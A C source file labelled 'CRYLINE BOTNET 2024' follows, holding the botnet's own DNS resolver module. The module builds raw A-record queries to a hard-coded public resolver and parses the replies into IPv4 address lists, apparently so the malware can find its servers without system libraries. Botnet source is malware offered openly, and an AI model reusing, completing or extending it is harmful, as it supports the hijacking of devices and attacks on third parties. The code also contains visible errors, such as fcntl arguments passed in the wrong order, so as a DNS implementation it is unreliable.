/* 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;; CRYLINE BOTNET 2024  ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;      by @DarxiS      ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
*/

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/select.h>

#include "LIBRARIES.h"
#include "CUSTOM_FUNCTIONS.h"
#include "RANDOM_GENERATOR.h"
#include "DO53_PROTOCOL_STRUCTURE.h"
#include "LOCAL_RECURSIVE_DNS_RESOLVER.h"

void __DNS_RESOLVE(char *_RHOST, char *_DOMAIN)
{
    int GET_LENGHT = __STRLEN(_DOMAIN) + 1;
    char *GET_LBL = _RHOST, *GET_POSITION = _RHOST + 1;
    uint8_t GET_CURRENT_LENGHT = 0;

    while (GET_LENGHT-- > 0)
    {
        char SPLITTER = *_DOMAIN++;

        if (SPLITTER == '.' || SPLITTER == 0)
        {
            *GET_LBL = GET_CURRENT_LENGHT;
            GET_LBL = GET_POSITION++;
            GET_CURRENT_LENGHT = 0;
        }
        else
        {
            GET_CURRENT_LENGHT++;
            *GET_POSITION++ = SPLITTER;
        }
    }
    *GET_POSITION = 0;
}

static void __DNS_RESOLVE_WITH_SKIP_NAME(uint8_t *_READER, uint8_t *_BUFFER, int *_COUNTER)
{
    unsigned int GET_JUMPED = 0, GET_OFFSET;

    *_COUNTER = 1;

    while(*_READER != 0)
    {
        if (*_READER >= 192)
        {
            GET_OFFSET = (*_READER)*256 + *(_READER+1) - 49152;
            _READER = _BUFFER + GET_OFFSET - 1;
            GET_JUMPED = 1;
        }

        _READER = _READER+1;

        if (GET_JUMPED == 0)
        {
            *_COUNTER = *_COUNTER + 1;
        }
    }

    if (GET_JUMPED == 1)
    {
        *_COUNTER = *_COUNTER + 1;
    }
}

struct __RESOLVE_DNS_ENTRIES *__LOOKUP(char *_DOMAIN_NAME)
{
    struct __RESOLVE_DNS_ENTRIES *DNS_ENTRIES = calloc(1, sizeof(struct __RESOLVE_DNS_ENTRIES));
    char QUERY[2048], ANSWER[2048];
    struct __DNS_PROTOCOL_HEADERS *DNS_HEADERS = (struct __DNS_PROTOCOL_HEADERS *)QUERY;
    char *DNS_QNAME_HEADER = (char *)(DNS_HEADERS + 1);

    __DNS_RESOLVE(DNS_QNAME_HEADER, _DOMAIN_NAME);

    struct __DNS_QUESTION_HEADER *DNS_STATE = (struct __DNS_QUESTION_HEADER *)(DNS_QNAME_HEADER + __STRLEN(DNS_QNAME_HEADER) + 1);
    struct sockaddr_in GET_ADDRESS = {0};
    int DNS_QUERY_LENGHT = sizeof(struct __DNS_PROTOCOL_HEADERS) + __STRLEN(DNS_QNAME_HEADER) + 1 + sizeof(struct __DNS_QUESTION_HEADER);
    int GET_TRIES = 0, GET_DESCRIPTOR = -1, I_COUNTER = 0;
    uint16_t DNS_ID = __RANDOM_NEXT() % 0xFFFF;

    __ZERO(&GET_ADDRESS, sizeof(struct sockaddr_in));
    GET_ADDRESS.sin_family = AF_INET;
    GET_ADDRESS.sin_addr.s_addr = __INET_ADDR(77,88,8,8);
    GET_ADDRESS.sin_port = htons(53);

    DNS_HEADERS->_ID = DNS_ID;
    DNS_HEADERS->_OPCODE = htons(1 << 8);
    DNS_HEADERS->_QDCOUNT = htons(1);

    DNS_STATE->_QTYPE = htons(1);
    DNS_STATE->_QCLASS = htons(1);

    while (GET_TRIES++ < 5)
    {
        fd_set FD_SET;
        struct timeval TIME_VALUE;
        int GET_LOCAL_COUNTER;

        if (GET_DESCRIPTOR != -1)
        {
            close(GET_DESCRIPTOR);
        }

        if ((GET_DESCRIPTOR = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
            sleep(1);
            continue;
        }

        if (connect(GET_DESCRIPTOR, (struct sockaddr *)&GET_ADDRESS, sizeof(struct sockaddr_in)) == -1)
        {
            sleep(1);
            continue;
        }

        if (send(GET_DESCRIPTOR, QUERY, DNS_QUERY_LENGHT, MSG_NOSIGNAL) == -1)
        {
            sleep(1);
            continue;
        }

        fcntl(F_SETFL, GET_DESCRIPTOR, O_NONBLOCK | fcntl(F_GETFL, GET_DESCRIPTOR, 0));

        FD_ZERO(&FD_SET);
        FD_SET(GET_DESCRIPTOR, &FD_SET);

        TIME_VALUE.tv_sec = 5;
        TIME_VALUE.tv_usec = 0;

        GET_LOCAL_COUNTER = select(GET_DESCRIPTOR + 1, &FD_SET, NULL, NULL, &TIME_VALUE);

        if (GET_LOCAL_COUNTER == -1)
        {
            break;
        }
        else if (GET_LOCAL_COUNTER == 0)
        {
            continue;
        }
        else if (FD_ISSET(GET_DESCRIPTOR, &FD_SET))
        {
            int RETURN_STATE = recvfrom(GET_DESCRIPTOR, ANSWER, sizeof(ANSWER), MSG_NOSIGNAL, NULL, NULL);

            char *GET_NAME;
            uint16_t ANCOUNT_HEADER;
            int STOP_STATE;

            if (RETURN_STATE < (sizeof(struct __DNS_PROTOCOL_HEADERS) + __STRLEN(DNS_QNAME_HEADER) + 1 + sizeof(struct __DNS_QUESTION_HEADER)))
            {
                continue;
            }

            DNS_HEADERS = (struct __DNS_PROTOCOL_HEADERS *)ANSWER;
            DNS_QNAME_HEADER = (char *)(DNS_HEADERS + 1);
            DNS_STATE = (struct __DNS_QUESTION_HEADER *)(DNS_QNAME_HEADER + __STRLEN(DNS_QNAME_HEADER) + 1);
            GET_NAME = (char *)(DNS_STATE + 1);

            if (DNS_HEADERS->_ID != DNS_ID)
            {
                continue;
            }
            if (DNS_HEADERS->_ANCOUNT == 0)
            {
                continue;
            }

            ANCOUNT_HEADER = ntohs(DNS_HEADERS->_ANCOUNT);

            while (ANCOUNT_HEADER-- > 0)
            {
                struct __DNS_ANSWER_HEADER *GET_RDATA = NULL;

                __DNS_RESOLVE_WITH_SKIP_NAME(GET_NAME, ANSWER, &STOP_STATE);
                GET_NAME = GET_NAME + STOP_STATE;

                GET_RDATA = (struct __DNS_ANSWER_HEADER *)GET_NAME;
                GET_NAME = GET_NAME + sizeof(struct __DNS_ANSWER_HEADER);

                if (GET_RDATA->_TYPE == htons(1) && GET_RDATA->_CLASS == htons(1))
                {
                    if (ntohs(GET_RDATA->_RDLENGTH) == 4)
                    {
                        uint32_t *GET_LOCAL_POINTER;
                        uint8_t GET_TEMP_BUFFER[4];

                        for (I_COUNTER = 0; I_COUNTER < 4; I_COUNTER++)
                        {
                            GET_TEMP_BUFFER[I_COUNTER] = GET_NAME[I_COUNTER];
                        }

                        GET_LOCAL_POINTER = (uint32_t *)GET_TEMP_BUFFER;

                        DNS_ENTRIES->_ADDRESS = realloc(DNS_ENTRIES->_ADDRESS, (DNS_ENTRIES->_ADDRESS_LENGHT + 1) * sizeof(__IPV4));
                        DNS_ENTRIES->_ADDRESS[DNS_ENTRIES->_ADDRESS_LENGHT++] = (*GET_LOCAL_POINTER);
                    }

                    GET_NAME = GET_NAME + ntohs(GET_RDATA->_RDLENGTH);
                } 
                else 
                {
                    __DNS_RESOLVE_WITH_SKIP_NAME(GET_NAME, ANSWER, &STOP_STATE);
                    GET_NAME = GET_NAME + STOP_STATE;
                }
            }
        }
        break;
    }

    close(GET_DESCRIPTOR);

    if (DNS_ENTRIES->_ADDRESS_LENGHT > 0)
    {
        return DNS_ENTRIES;
    }
    else
    {
        __RESOLVE_FREE_ENTRIES(DNS_ENTRIES);

        return NULL;
    }
}

void __RESOLVE_FREE_ENTRIES(struct __RESOLVE_DNS_ENTRIES *_DNS_ENTRIES)
{
    if (_DNS_ENTRIES == NULL)
    {
        return;
    }
    if (_DNS_ENTRIES->_ADDRESS != NULL)
    {
        free(_DNS_ENTRIES->_ADDRESS);
    }

    free(_DNS_ENTRIES);
}
